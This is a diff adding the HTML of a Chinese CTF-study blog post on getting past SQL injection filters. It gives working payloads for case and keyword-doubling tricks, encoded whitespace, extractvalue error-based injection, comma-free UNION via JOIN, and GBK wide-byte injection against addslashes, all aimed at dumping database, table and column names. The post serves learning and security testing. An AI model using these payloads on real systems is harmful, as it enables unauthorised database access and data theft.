@@ -1,0 +1,410 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入过滤绕过 | FLYFISH</title><meta name="author" content="FLYFISH"><meta name="copyright" content="FLYFISH"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="过滤注释符绕过常见注释符-- # %23 如何判断页面过滤对象从最简单的注入命令开始，一步步增加复杂性，通过此方法判断过滤对象。 策略 基础测试：优先尝试 --、#、%23。 闭合语句：若注释符全被过滤，直接闭合引号或逻辑。 编码与空白符：尝试 URL 编码、换行符、TAB 符。  绕过方法闭合引号 1234567数字型不用考虑闭合，正常使用语句即可字符型&#x27;&#x27;单引号闭合只需要在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入过滤绕过">
+<meta property="og:url" content="https://flyfish567.github.io/posts/a7642d18.html">
+<meta property="og:site_name" content="FLYFISH">
+<meta property="og:description" content="过滤注释符绕过常见注释符-- # %23 如何判断页面过滤对象从最简单的注入命令开始，一步步增加复杂性，通过此方法判断过滤对象。 策略 基础测试：优先尝试 --、#、%23。 闭合语句：若注释符全被过滤，直接闭合引号或逻辑。 编码与空白符：尝试 URL 编码、换行符、TAB 符。  绕过方法闭合引号 1234567数字型不用考虑闭合，正常使用语句即可字符型&#x27;&#x27;单引号闭合只需要在">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250225164205.bmp">
+<meta property="article:published_time" content="2025-03-08T07:41:57.005Z">
+<meta property="article:modified_time" content="2025-03-09T11:34:30.110Z">
+<meta property="article:author" content="FLYFISH">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="绕过">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250225164205.bmp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SQL注入过滤绕过",
+  "url": "https://flyfish567.github.io/posts/a7642d18.html",
+  "image": "https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164205.bmp",
+  "datePublished": "2025-03-08T07:41:57.005Z",
+  "dateModified": "2025-03-09T11:34:30.110Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "FLYFISH",
+      "url": "https://flyfish567.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://flyfish567.github.io/posts/a7642d18.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="manifest" href="/manifest.json"/><meta name="msapplication-TileColor" content="#3b70fc"/><link rel="apple-touch-icon" sizes="180x180" href="/img/siteicon/128.png"/><link rel="icon" type="image/png" sizes="32x32" href="/img/siteicon/32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/img/siteicon/16.png"/><link rel="mask-icon" href="/img/siteicon/128.png" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL注入过滤绕过',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu@1.1.6/lib/clock.min.css" /><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="FLYFISH" type="application/atom+xml">
+</head><body><div id="web_bg" style="background-image: url(https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgbackground.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-film"></i><span> 电影</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/bangumis/index.html"><i class="fa-fw fas fa-heart"></i><span> 追番</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-solid fa-image"></i><span> 相册</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164205.bmp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">FLYFISH</span></a><a class="nav-page-title" href="/"><span class="site-name">SQL注入过滤绕过</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-film"></i><span> 电影</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/bangumis/index.html"><i class="fa-fw fas fa-heart"></i><span> 追番</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-solid fa-image"></i><span> 相册</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入过滤绕过</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-08T07:41:57.005Z" title="发表于 2025-03-08 15:41:57">2025-03-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-09T11:34:30.110Z" title="更新于 2025-03-09 19:34:30">2025-03-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E5%AD%A6%E4%B9%A0/">CTF学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="过滤注释符绕过"><a href="#过滤注释符绕过" class="headerlink" title="过滤注释符绕过"></a>过滤注释符绕过</h2><p>常见注释符<code>--</code> <code>#</code> <code>%23</code></p>
+<h3 id="如何判断页面过滤对象"><a href="#如何判断页面过滤对象" class="headerlink" title="如何判断页面过滤对象"></a>如何判断页面过滤对象</h3><p>从最简单的注入命令开始，一步步增加复杂性，通过此方法判断过滤对象。</p>
+<h3 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h3><ol>
+<li><strong>基础测试</strong>：优先尝试 <code>--</code>、<code>#</code>、<code>%23</code>。</li>
+<li><strong>闭合语句</strong>：若注释符全被过滤，直接闭合引号或逻辑。</li>
+<li><strong>编码与空白符</strong>：尝试 URL 编码、换行符、TAB 符。</li>
+</ol>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p><strong>闭合引号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数字型</span><br><span class="line">不用考虑闭合，正常使用语句即可</span><br><span class="line">字符型</span><br><span class="line">&#x27;&#x27;单引号闭合只需要在后面增加一个单引号</span><br><span class="line">&quot;&quot;双引号闭合只需要在后面增加一个双引号</span><br><span class="line">(&#x27;&#x27;)单引号括号闭合需要多加个 or(&#x27;1&#x27;)=(&#x27;1</span><br><span class="line">(&quot;&quot;)双引号括号闭合需要多加个 or(&quot;1&quot;)=(&quot;1</span><br></pre></td></tr></table></figure>
+<h2 id="过滤AND-OR绕过"><a href="#过滤AND-OR绕过" class="headerlink" title="过滤AND OR绕过"></a>过滤<code>AND OR</code>绕过</h2><p><code>and or</code></p>
+<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><p><strong>大小写绕过</strong></p>
+<p><code>?id=1 anD 1=1 -- +</code></p>
+<p><strong>复写绕过</strong></p>
+<p><code>?id=1&#39; anandd 1=1 -- +</code></p>
+<p><strong>取代</strong></p>
+<p><code>用&amp;&amp;取代and ，用||取代or</code></p>
+<p>若报错显示无法识别，则将<code>&amp;&amp;</code>和<code>||</code>用url编码替代</p>
+<p><code>&amp;&amp; url编码为%26%26</code></p>
+<p><code>||url编码为%7c%7c</code></p>
+<h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><h3 id="绕过方法-2"><a href="#绕过方法-2" class="headerlink" title="绕过方法"></a>绕过方法</h3><p><strong>使用+号代替空格</strong></p>
+<p><strong>URL编码代替空格</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%20（标准URL编码）</span><br><span class="line">%A0</span><br><span class="line">%09</span><br><span class="line">%0A</span><br><span class="line">%0C</span><br><span class="line">%0D</span><br><span class="line">%0B</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong>改用报错注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤了and or 空格 注释符</span><br><span class="line">?id=1000&#x27;||extractvalue(1,concat(&#x27;~&#x27;,(database()))||&#x27;1&#x27;=&#x27;1   //没有用到空格，||绕过了or过滤，引号闭合绕过了注释符过滤</span><br><span class="line">?id=1000&#x27;||extractvalue(1,concat(&#x27;~&#x27;,(select(group_concat(table_name)from(infoorrmation_schema.tables)where(table_schema=(database())))))||&#x27;1&#x27;=&#x27;1 </span><br><span class="line">//没有用到空格，||和复写(infoorrmation_shema)绕过了or过滤，引号闭合绕过了注释符过滤</span><br></pre></td></tr></table></figure>
+<h2 id="逗号过滤绕过"><a href="#逗号过滤绕过" class="headerlink" title="逗号过滤绕过"></a>逗号过滤绕过</h2><p>逗号过滤之后无法使用<code>union select 1,2,3</code></p>
+<h3 id="绕过方法-3"><a href="#绕过方法-3" class="headerlink" title="绕过方法"></a>绕过方法</h3><p><strong><code>join</code></strong></p>
+<p><strong>功能</strong>：合并两个或多个表的行，基于关联关系</p>
+<p><strong>本质</strong>：<code>join</code>是关联操作符，必须配合<code>on、using</code>或隐性关系关联逻辑</p>
+<p><strong>保证<code>join</code>查询和<code>union select</code>列数必须完全相同</strong></p>
+<p><strong>使用过程</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#提取数据库版本和当前用户</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> @<span class="variable">@version</span>)a <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="keyword">user</span>())b</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> </span><br><span class="line">#等价于</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">JOIN</span> (<span class="keyword">select</span> <span class="number">2</span>) b <span class="keyword">JOIN</span> (<span class="keyword">select</span> <span class="number">3</span>)c</span><br><span class="line">#如果页面显示 <span class="number">2</span> 和 <span class="number">3</span>，说明第 <span class="number">2</span>、<span class="number">3</span> 列可输出数据。</span><br><span class="line">查询库名</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span>) a </span><br><span class="line"><span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> database()) b #第<span class="number">2</span>列显示库名</span><br><span class="line"><span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">3</span>) c</span><br><span class="line">查询表名</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span>) a </span><br><span class="line"><span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> GROUP_CONCAT(table_name) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>database()) b </span><br><span class="line"><span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">3</span>) c </span><br><span class="line">查询字段名（例如查看 `users` 表的字段）</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span>)a </span><br><span class="line"><span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> GROUP_CONCAT(column_name) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)b </span><br><span class="line"><span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">3</span>)c </span><br></pre></td></tr></table></figure>
+<h2 id="select、union过滤绕过"><a href="#select、union过滤绕过" class="headerlink" title="select、union过滤绕过"></a><code>select、union</code>过滤绕过</h2><h3 id="绕过方法-4"><a href="#绕过方法-4" class="headerlink" title="绕过方法"></a>绕过方法</h3><p><strong>大小写绕过</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">过滤空格，<span class="keyword">union</span>、<span class="keyword">select</span>，注释符 </span><br><span class="line">?id<span class="operator">=</span><span class="number">1000</span><span class="string">&#x27;uNion%0AsElect%0A1,2,3%0Aor&#x27;</span><span class="number">1</span><span class="string">&#x27;=1</span></span><br><span class="line"><span class="string">union select 通过大小写变化改为uNion和sElect</span></span><br><span class="line"><span class="string">%0A为空格URL编码</span></span><br><span class="line"><span class="string">&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>为绕过注释词过滤</span><br></pre></td></tr></table></figure>
+<p><strong>复写单词绕过</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">过滤空格，<span class="keyword">union</span>、<span class="keyword">select</span>，注释符 </span><br><span class="line">?id<span class="operator">=</span><span class="number">1000</span><span class="string">&#x27;uunionnion%0Asselectelect%0A1,2,3%0Aor&#x27;</span><span class="number">1</span><span class="string">&#x27;=1</span></span><br><span class="line"><span class="string">union select 通过大小写变化改为uunionnion和sselectelect</span></span><br><span class="line"><span class="string">%0A为空格URL编码</span></span><br><span class="line"><span class="string">&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>为绕过注释词过滤</span><br></pre></td></tr></table></figure>
+<p><strong>报错注入</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤空格，<span class="keyword">union</span>、<span class="keyword">select</span>，注释符 </span><br><span class="line">?id<span class="operator">=</span><span class="number">1000</span><span class="string">&#x27;||extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(database()))||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>   <span class="operator">/</span><span class="operator">/</span>没有用到空格，<span class="operator">||</span>绕过了<span class="keyword">or</span>过滤，引号闭合绕过了注释符过滤</span><br><span class="line">?id<span class="operator">=</span><span class="number">1000</span><span class="string">&#x27;||extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select(group_concat(table_name)from(infoorrmation_schema.tables)where(table_schema=(database())))))||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>没有用到空格，<span class="operator">||</span>和复写(infoorrmation_shema)绕过了<span class="keyword">or</span>过滤，引号闭合绕过了注释符过滤</span><br></pre></td></tr></table></figure>
+<p><strong>URL编码绕过</strong></p>
+<h2 id="宽字节注入绕过"><a href="#宽字节注入绕过" class="headerlink" title="宽字节注入绕过"></a>宽字节注入绕过</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p><strong>要求数据库编码方式为GBK编码，并且发请求时声明客户端用到也是GBK编码</strong></p>
+<h3 id="对抗函数"><a href="#对抗函数" class="headerlink" title="对抗函数"></a>对抗函数</h3><p><strong><code>addslashes()</code></strong></p>
+<p><strong>作用</strong>：</p>
+<p>检查用户提交参数是否有<code>&#39;&#39;单引号&quot;&quot;双引号 \反斜线与NUL(NULL字符)</code>，如果有，全部增加<code>\</code>，将符号实体化</p>
+<p><strong>举例</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;php</span><br><span class="line">$a=&#x27;i am &quot;ctfer&quot;&#x27;;</span><br><span class="line">$b=addslashes($a);</span><br><span class="line">// 此时 $b被赋值为 `i am \&quot;ctfer&quot;\`，&quot;&quot;双引号失去了作用</span><br><span class="line">如果提交的是1&#x27;,那么将变为1\&#x27;，无法查询1&#x27;</span><br></pre></td></tr></table></figure>
+<h3 id="GBK编码"><a href="#GBK编码" class="headerlink" title="GBK编码"></a>GBK编码</h3><h3 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h3><ul>
+<li><p><strong>多字节编码特性</strong>：<br>在 GBK 编码中，某些字符由 <strong>两个字节</strong> 组成。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;運&quot; 的 GBK 编码：0xdf 0x5c</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>关键点</strong>：第二个字节 <code>0x5c</code> 对应 ASCII 的 <code>\</code>（反斜杠）。</li>
+</ul>
+</li>
+<li><p><strong>转义符号被“吞并”</strong>：<br>当用户输入 <code>%df&#39;</code>（<code>%df</code> 是 <code>0xdf</code> 的 URL 编码）时：</p>
+<ol>
+<li>转义函数将 <code>&#39;</code> 转义为 <code>\&#39;</code>，即 <code>%df%5c%27</code>。</li>
+<li>数据库按 GBK 解码时，将 <code>%df%5c</code> 解析为完整字符（如 <code>運</code>），导致 <code>%27</code>（<code>&#39;</code>）未被转义。</li>
+<li>最终单引号 <code>&#39;</code> 逃逸，引发注入。</li>
+</ol>
+</li>
+</ul>
+<h3 id="绕过方法-5"><a href="#绕过方法-5" class="headerlink" title="绕过方法"></a>绕过方法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; -- +</span></span><br><span class="line"><span class="string">函数addslashes把&#x27;</span>转义为\<span class="string">&#x27;</span></span><br><span class="line"><span class="string">GBK编码%df\为一个数据库无法识别的中文，因此\符号失效</span></span><br><span class="line"><span class="string">?id=0%df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database() <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://flyfish567.github.io">FLYFISH</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://flyfish567.github.io/posts/a7642d18.html">https://flyfish567.github.io/posts/a7642d18.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://flyfish567.github.io" target="_blank">FLYFISH</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><a class="post-meta__tags" href="/tags/%E7%BB%95%E8%BF%87/">绕过</a></div><div class="post-share"><div class="social-share" data-image="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164205.bmp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/fe305eff.html" title="命令执行函数"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img373f68957c1a6b90f5f394cf59c2dfed395143382.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div 